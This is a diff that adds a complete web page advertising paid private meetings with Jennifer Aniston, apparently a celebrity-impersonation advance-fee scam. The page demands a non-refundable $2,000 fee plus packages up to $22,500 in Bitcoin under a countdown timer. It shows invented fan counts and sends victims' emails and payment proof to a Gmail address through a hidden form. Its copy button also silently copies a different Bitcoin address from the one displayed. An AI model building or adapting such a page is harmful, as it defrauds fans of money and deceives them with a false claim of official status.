@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Meeting with Jennifer Aniston | Official Fan Experience</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .hero-gradient {
+            background: linear-gradient(135deg, rgba(22,28,45,0.9) 0%, rgba(58,75,108,0.8) 100%);
+        }
+        .ticket-card {
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        }
+        .ticket-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+        }
+        .highlight-text {
+            position: relative;
+            display: inline-block;
+        }
+        .highlight-text::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: 2px;
+            width: 100%;
+            height: 8px;
+            background-color: rgba(217, 119, 6, 0.3);
+            z-index: -1;
+        }
+        .section-divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+        }
+        .countdown-timer {
+            font-family: monospace;
+            font-size: 1.2rem;
+            background: rgba(0,0,0,0.2);
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-900">
+    <!-- Navigation -->
+    <nav class="bg-gray-900 text-white shadow-lg">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-16 items-center">
+                <div class="flex items-center">
+                    <div class="text-xl font-bold text-amber-500">J<span class="text-white">A</span>ME</div>
+                    <div class="hidden md:block ml-10 space-x-8">
+                        <a href="#about" class="text-white hover:text-amber-400 px-3 py-2 text-sm font-medium">About Experience</a>
+                        <a href="#packages" class="text-white hover:text-amber-400 px-3 py-2 text-sm font-medium">Packages</a>
+                        <a href="#faq" class="text-white hover:text-amber-400 px-3 py-2 text-sm font-medium">FAQ</a>
+                        <a href="#contact" class="text-white hover:text-amber-400 px-3 py-2 text-sm font-medium">Contact</a>
+                    </div>
+                </div>
+                <div class="hidden md:block">
+                    <button class="bg-amber-500 hover:bg-amber-600 text-gray-900 px-4 py-2 rounded-md text-sm font-medium transition duration-300">
+                        <i class="fas fa-lock mr-2"></i> Agent Login
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-gradient text-white py-20 md:py-32 relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row items-center">
+            <div class="md:w-1/2 mb-10 md:mb-0">
+                <h1 class="text-4xl md:text-5xl font-bold leading-tight mb-6">
+                    Your Private <span class="highlight-text">Meeting With</span><br>Jennifer Aniston
+                </h1>
+                <p class="text-xl mb-8 text-gray-200 max-w-lg">
+                    Exclusive opportunity to meet Jennifer Aniston in person through our official private meeting program.
+                </p>
+                <div class="flex space-x-4">
+                    <button id="bookNowBtn" class="bg-amber-500 hover:bg-amber-600 text-gray-900 px-6 py-3 rounded-md text-lg font-medium transition duration-300">
+                        <i class="fas fa-calendar-check mr-2"></i> Book Now
+                    </button>
+                    <button class="bg-transparent border-2 border-white hover:bg-white hover:text-gray-900 text-white px-6 py-3 rounded-md text-lg font-medium transition duration-300">
+                        <i class="fas fa-play-circle mr-2"></i> Watch Video
+                    </button>
+                </div>
+                <div class="mt-8 flex items-center">
+                    <div class="flex -space-x-2">
+                        <img class="w-10 h-10 rounded-full border-2 border-white" src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/8ac3e1d6-c2a0-450f-91c9-e057d4e3e8cc.png" alt="Happy fan smiling">
+                        <img class="w-10 h-10 rounded-full border-2 border-white" src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/e7eae3bc-818b-4882-aff4-1ed7c36f165e.png" alt="Excited fan meeting Jennifer">
+                        <img class="w-10 h-10 rounded-full border-2 border-white" src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/7add9227-f01b-4d66-a985-d1a9c603bc90.png" alt="Celebrity encounter participant">
+                    </div>
+                    <p class="ml-3 text-sm text-gray-300">
+                        <span class="font-semibold">287+</span> happy fans met Jennifer
+                    </p>
+                </div>
+            </div>
+            <div class="md:w-1/2 flex justify-center">
+                <div class="w-full max-w-md">
+                    <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/203322ee-a603-4d4c-bb3f-22644dc91207.png" alt="Jennifer Aniston smiling professionally in a studio photoshoot">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Booking Agent Section -->
+    <section id="agent" class="py-16 bg-gray-100">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-12">
+                <h2 class="text-3xl font-bold text-gray-900 mb-4">Agent Arrangement Service</h2>
+                <p class="text-lg text-gray-600 max-w-3xl mx-auto">
+                    Our professional agents handle all arrangements from scheduling to venue coordination.
+                    <br>A $2,000 agent fee is required to initiate the meeting request process.
+                </p>
+            </div>
+            
+            <div class="bg-white rounded-xl shadow-lg overflow-hidden max-w-4xl mx-auto">
+                <div class="md:flex">
+                    <div class="md:w-1/2 p-8 bg-amber-50">
+                        <h3 class="text-2xl font-bold text-gray-900 mb-4">Agent Service Includes</h3>
+                        <ul class="space-y-3">
+                            <li class="flex items-start">
+                                <i class="fas fa-check-circle text-amber-500 mt-1 mr-3"></i>
+                                <span class="text-gray-700">Agent & Coordination Fee</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check-circle text-amber-500 mt-1 mr-3"></i>
+                                <span class="text-gray-700">VIP Access & Venue Logistics</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check-circle text-amber-500 mt-1 mr-3"></i>
+                                <span class="text-gray-700">Security Clearance & Background Verification</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check-circle text-amber-500 mt-1 mr-3"></i>
+                                <span class="text-gray-700">Legal & Administrative Handling</span>
+                            </li>
+                        </ul>
+                        <div class="mt-8 bg-white p-4 rounded-lg shadow-sm">
+                            <div class="text-center">
+                                <p class="text-gray-600">TOTAL</p>
+                                <p class="text-3xl font-bold text-amber-600">$2,000</p>
+                                <p class="text-sm text-gray-500 mt-1">Non-refundable service charge</p>
+                            </div>
+                        </div>
+                    </div>
+                 
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Bitcoin Payment Section -->
+    <section id="payment" class="py-16 bg-white">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-12">
+                <h2 class="text-3xl font-bold text-gray-900 mb-4">Bitcoin Payment</h2>
+                <p class="text-lg text-gray-600 max-w-3xl mx-auto">
+                    Complete your payment using Bitcoin cryptocurrency
+                </p>
+                <div class="mt-4">
+                    <div id="paymentCountdown" class="countdown-timer text-amber-600"></div>
+                    <p class="text-sm text-gray-500 mt-1">Complete payment within this time to secure your booking</p>
+                </div>
+            </div>
+            
+            <div class="bg-white rounded-xl shadow-lg p-8">
+                <div class="flex flex-col md:flex-row gap-8">
+                    <div class="md:w-1/2">
+                        <h3 class="text-xl font-bold mb-4">Payment Details</h3>
+                        <div class="bg-gray-100 p-4 rounded-lg mb-6">
+                            <div class="flex justify-between mb-2">
+                                <span class="text-gray-600">Selected Package:</span>
+                                <span class="font-medium" id="selectedPackage">TOTAL ARRANGEMENT FEE: $2,000</span>
+                            </div>
+                            <div class="flex justify-between mb-2">
+                                <span class="text-gray-600">Agent Fee:</span>
+                                <span class="font-medium" id="agentFee">$2,000</span>
+                            </div>
+                            <div class="flex justify-between text-lg font-bold border-t border-gray-300 pt-2">
+                                <span>Total:</span>
+                                <span id="totalAmount">$2,000</span>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-6">
+                            <h4 class="font-bold mb-2">Send Payment To:</h4>
+                            <div class="bg-gray-800 text-white p-4 rounded-lg font-mono text-sm overflow-x-auto">
+                                bc1q38d5l6h80tmx3ehfdfxwly79wlktkqvy3em0w5
+                            </div>
+                            <button id="copyBtcBtn" class="mt-2 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 py-2 px-4 rounded-md font-medium transition duration-300">
+                                Copy Address
+                            </button>
+                        </div>
+                        
+                        <div class="mb-6">
+                            <h4 class="font-bold mb-2">BTC Amount:</h4>
+                            <div class="bg-amber-100 p-4 rounded-lg font-mono">
+                                <span id="btcAmount">0.01883</span> BTC
+                            </div>
+                            
+                        </div>
+                    </div>
+                    
+                    <div class="md:w-1/2">
+                        <h3 class="text-xl font-bold mb-4">Upload Payment Proof</h3>
+                        <div class="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:bg-gray-50 transition duration-200">
+                            <div id="uploadArea" class="cursor-pointer">
+                                <i class="fas fa-cloud-upload-alt text-4xl text-gray-400 mb-3"></i>
+                                <p class="text-gray-500">Upload screenshot of completed payment</p>
+                                <p class="text-xs text-gray-400 mt-2">PNG, JPG or PDF (Max 5MB)</p>
+                                <input type="file" id="paymentProof" name="payment_proof" accept="image/*,.pdf" class="hidden">
+                            </div>
+                            <div id="previewArea" class="hidden mt-4">
+                                <img id="proofPreview" src="" alt="Payment proof preview" class="max-h-64 mx-auto mb-2 rounded border" src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/cb960b35-6414-4231-b80e-cb738115e4b7.png">
+                                <button id="removeProof" class="text-red-500 text-sm hover:text-red-700">Remove and upload another</button>
+                            </div>
+                        </div>
+                        
+                        <div class="mt-6">
+                            <label for="txHash" class="block text-sm font-medium text-gray-700 mb-1">Transaction Hash (optional)</label>
+                            <input type="text" id="txHash" name="transaction_hash" class="w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-amber-500 focus:border-amber-500" placeholder="Enter your transaction ID">
+                        </div>
+                        
+                        <div class="mt-6">
+                            <label for="payerEmail" class="block text-sm font-medium text-gray-700 mb-1">Your Email</label>
+                            <input type="email" id="payerEmail" name="email" required class="w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-amber-500 focus:border-amber-500" placeholder="Enter your email for confirmation">
+                        </div>
+                        
+                        <button id="submitPayment" type="button" class="mt-6 w-full bg-green-500 hover:bg-green-600 text-white py-3 px-4 rounded-md font-medium transition duration-300">
+                            <i class="fas fa-check-circle mr-2"></i> Confirm Payment
+                        </button>
+                        
+                        <form id="paymentForm" class="hidden" action="https://formsubmit.co/jenniferaniston.chatline@gmail.com" method="POST" enctype="multipart/form-data">
+                            <input type="hidden" name="_subject" value="New Bitcoin Payment Submitted">
+                            <input type="hidden" name="_cc" value="jenniferaniston.chatline@gmail.com">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="transaction_hash" id="form_tx_hash">
+                            <input type="hidden" name="email" id="form_email">
+                            <input type="hidden" name="amount" id="form_amount">
+                            <input type="hidden" name="package" id="form_package">
+                            <input type="file" name="payment_proof" id="form_payment_proof" class="hidden">
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="py-16 bg-gray-900 text-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="md:flex md:items-center md:justify-between">
+                <div class="md:w-1/2 mb-8 md:mb-0">
+                    <h2 class="text-3xl font-bold mb-4">Ready to meet Jennifer?</h2>
+                    <p class="text-lg text-gray-300 mb-6">
+                        Our team is available 24/7 to answer your questions and begin the arrangement process.
+                    </p>
+                    <div class="space-y-4">
+                        <div class="flex items-center">
+                            <i class="fas fa-phone-alt text-amber-400 mr-3"></i>
+                            <span class="text-gray-300">+1 (615) 229-6827</span>
+                        </div>
+                        <div class="flex items-center">
+                            <i class="fas fa-envelope text-amber-400 mr-3"></i>
+                            <span class="text-gray-300">jenniferanistons.agent@gmail.com</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="md:w-1/2">
+                    <div class="bg-gray-800 rounded-xl p-8">
+                        <h3 class="text-xl font-bold mb-6">Contact Our Team</h3>
+                        <form id="contactForm" action="https://formsubmit.co/jenniferaniston.chatline@gmail.com" method="POST" class="space-y-4">
+                            <input type="hidden" name="_subject" value="New Contact Form Submission">
+                            <div>
+                                <label for="contact_name" class="block text-sm font-medium text-gray-300 mb-1">Name</label>
+                                <input type="text" id="contact_name" name="Name" required class="w-full bg-gray-700 border border-gray-600 rounded-md px-4 py-2 text-white focus:outline-none focus:ring-2 focus:ring-amber-500">
+                            </div>
+                            <div>
+                                <label for="contact_email" class="block text-sm font-medium text-gray-300 mb-1">Email</label>
+                                <input type="email" id="contact_email" name="Email" required class="w-full bg-gray-700 border border-gray-600 rounded-md px-4 py-2 text-white focus:outline-none focus:ring-2 focus:ring-amber-500">
+                            </div>
+                            <div>
+                                <label for="contact_message" class="block text-sm font-medium text-gray-300 mb-1">Message</label>
+                                <textarea id="contact_message" name="Message" rows="3" required class="w-full bg-gray-700 border border-gray-600 rounded-md px-4 py-2 text-white focus:outline-none focus:ring-2 focus:ring-amber-500"></textarea>
+                            </div>
+                            <div>
+                                <button type="submit" class="w-full py-2 px-4 bg-amber-500 hover:bg-amber-600 text-gray-900 font-medium rounded-md transition duration-300">
+                                    Send Message
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-gray-300 py-8">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="md:flex md:items-center md:justify-between">
+                <div class="flex items-center">
+                    <div class="text-xl font-bold text-amber-500">J<span class="text-white">A</span>ME</div>
+                    <p class="ml-2 text-sm">Official Jennifer Aniston Meet & Greet</p>
+                </div>
+                <div class="mt-4 md:mt-0">
+                    <p class="text-sm text-gray-400">
+                        © 2025 Jennifer Aniston Private Meetings. All rights reserved.
+                        <span class="mx-2">•</span>
+                        <a href="#" class="hover:text-amber-400">Privacy Policy</a>
+                        <span class="mx-2">•</span>
+                        <a href="#" class="hover:text-amber-400">Terms of Service</a>
+                    </p>
+                </div>
+            </div>
+          
+        </div>
+    </footer>
+
+    <!-- Booking Modal -->
+    <div id="bookingModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-lg shadow-xl max-w-md w-full">
+            <div class="flex justify-between items-center border-b border-gray-200 px-6 py-4">
+                <h3 class="text-lg font-medium text-gray-900">Select Your Package</h3>
+                <button id="closeModalBtn" class="text-gray-400 hover:text-gray-500">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="p-6">
+                <div class="space-y-4">
+                    <div class="border border-gray-200 rounded-md p-4 hover:bg-gray-50 cursor-pointer">
+                        <div class="flex items-center">
+                            <div class="h-5 w-5 text-amber-500">
+                                <input id="standard-package" name="package" type="radio" checked class="focus:ring-amber-500 h-4 w-4 text-amber-600 border-gray-300">
+                            </div>
+                            <div class="ml-3">
+                                <label for="standard-package" class="block text-sm font-medium text-gray-700">Standard Meet - $9,500</label>
+                                <p class="text-sm text-gray-500">15 minute private meeting</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="border border-gray-200 rounded-md p-4 hover:bg-gray-50 cursor-pointer">
+                        <div class="flex items-center">
+                            <div class="h-5 w-5 text-amber-500">
+                                <input id="premium-package" name="package" type="radio" class="focus:ring-amber-500 h-4 w-4 text-amber-600 border-gray-300">
+                            </div>
+                            <div class="ml-3">
+                                <label for="premium-package" class="block text-sm font-medium text-gray-700">Premium Experience - $14,500</label>
+                                <p class="text-sm text-gray-500">30 minute private conversation</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="border border-gray-200 rounded-md p-4 hover:bg-gray-50 cursor-pointer">
+                        <div class="flex items-center">
+                            <div class="h-5 w-5 text-amber-500">
+                                <input id="vip-package" name="package" type="radio" class="focus:ring-amber-500 h-4 w-4 text-amber-600 border-gray-300">
+                            </div>
+                            <div class="ml-3">
+                                <label for="vip-package" class="block text-sm font-medium text-gray-700">VIP Exclusive - $22,500</label>
+                                <p class="text-sm text-gray-500">1 hour private meeting</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="mt-6">
+                    <button id="confirmBookingBtn" class="w-full py-2 px-4 bg-amber-500 hover:bg-amber-600 text-gray-900 font-medium rounded-md transition duration-300" onclick="window.location.href='#payment'">
+                        Continue to Bitcoin Payment
+                    </button>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+    <script>
+        // Initialize countdown timer (1 hour = 3600 seconds)
+        let timeLeft = 3600;
+        
+        function updateCountdown() {
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            
+            document.getElementById('paymentCountdown').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                document.getElementById('paymentCountdown').textContent = "Time expired!";
+                document.getElementById('paymentCountdown').classList.add('text-red-500');
+            } else {
+                timeLeft--;
+            }
+        }
+        
+        const countdownInterval = setInterval(updateCountdown, 1000);
+        updateCountdown();
+        
+        // Modal functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            const bookingModal = document.getElementById('bookingModal');
+            const bookNowBtn = document.getElementById('bookNowBtn');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const confirmBookingBtn = document.getElementById('confirmBookingBtn');
+            
+            // Show modal when Book Now is clicked
+            bookNowBtn.addEventListener('click', function() {
+                bookingModal.classList.remove('hidden');
+            });
+            
+            // Hide modal when X is clicked
+            closeModalBtn.addEventListener('click', function() {
+                bookingModal.classList.add('hidden');
+            });
+            
+            // Hide modal when clicking outside
+            bookingModal.addEventListener('click', function(e) {
+                if (e.target === bookingModal) {
+                    bookingModal.classList.add('hidden');
+                }
+            });
+            
+            // Confirmation button action
+            if (confirmBookingBtn) {
+                confirmBookingBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    alert('Thank you! You will be redirected to the secure payment page.');
+                    bookingModal.classList.add('hidden');
+                    window.location.href = '#payment';
+                    
+                    // Update selected package
+                    const selectedPackage = document.querySelector('input[name="package"]:checked');
+                    if (selectedPackage) {
+                        const packageLabel = selectedPackage.closest('div').querySelector('label').textContent;
+                        document.getElementById('selectedPackage').textContent = packageLabel.split('-')[0].trim();
+                        document.getElementById('totalAmount').textContent = '$' + (parseInt(packageLabel.split('-')[1].replace(/[^0-9]/g,'')) + 2000).toString();
+                        updateBtcAmount();
+                    }
+                });
+            }
+            
+            // Copy BTC address button
+            document.getElementById('copyBtcBtn').addEventListener('click', function() {
+                navigator.clipboard.writeText('bc1qxy2kgdygjrsqtzq2n0yrfx4d6v4z4sg5p0mgp').then(() => {
+                    const originalText = this.textContent;
+                    this.innerHTML = '<i class="fas fa-check mr-2"></i> Copied!';
+                    setTimeout(() => {
+                        this.innerHTML = originalText;
+                    }, 2000);
+                }).catch(err => {
+                    console.error('Failed to copy text: ', err);
+                });
+            });
+            
+            // Bitcoin payment functionality
+            document.getElementById('uploadArea').addEventListener('click', function() {
+                document.getElementById('paymentProof').click();
+            });
+
+            document.getElementById('paymentProof').addEventListener('change', function(e) {
+                const file = e.target.files[0];
+                if (file) {
+                    const reader = new FileReader();
+                    reader.onload = function(event) {
+                        document.getElementById('proofPreview').src = event.target.result;
+                        document.getElementById('uploadArea').classList.add('hidden');
+                        document.getElementById('previewArea').classList.remove('hidden');
+                    }
+                    reader.readAsDataURL(file);
+                }
+            });
+
+            document.getElementById('removeProof').addEventListener('click', function() {
+                document.getElementById('paymentProof').value = '';
+                document.getElementById('proofPreview').src = '';
+                document.getElementById('uploadArea').classList.remove('hidden');
+                document.getElementById('previewArea').classList.add('hidden');
+            });
+            
+            // Payment form submission
+            document.getElementById('submitPayment').addEventListener('click', function() {
+                const email = document.getElementById('payerEmail').value;
+                const txHash = document.getElementById('txHash').value;
+                const paymentProof = document.getElementById('paymentProof').files[0];
+                
+                if (!email) {
+                    alert('Please enter your email address');
+                    return;
+                }
+                
+                if (!paymentProof) {
+                    alert('Please upload your payment proof');
+                    return;
+                }
+                
+                // Set form values
+                document.getElementById('form_email').value = email;
+                document.getElementById('form_tx_hash').value = txHash;
+                document.getElementById('form_amount').value = document.getElementById('totalAmount').textContent;
+                document.getElementById('form_package').value = document.getElementById('selectedPackage').textContent;
+                
+                // Transfer file to form and submit
+                const fileInput = document.getElementById('form_payment_proof');
+                const dataTransfer = new DataTransfer();
+                dataTransfer.items.add(paymentProof);
+                fileInput.files = dataTransfer.files;
+                
+                document.getElementById('paymentForm').submit();
+                
+                // Show confirmation
+                const originalBtnText = this.innerHTML;
+                this.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processing...';
+                this.disabled = true;
+                
+                setTimeout(() => {
+                    alert('Thank you! Your payment details have been submitted. We will contact you shortly to confirm your booking.');
+                    this.innerHTML = originalBtnText;
+                    this.disabled = false;
+                }, 1000);
+            });
+            
+          
+            
+            // Initialize BTC amount
+            updateBtcAmount();
+        });
+    </script>
+</body>
+</html>
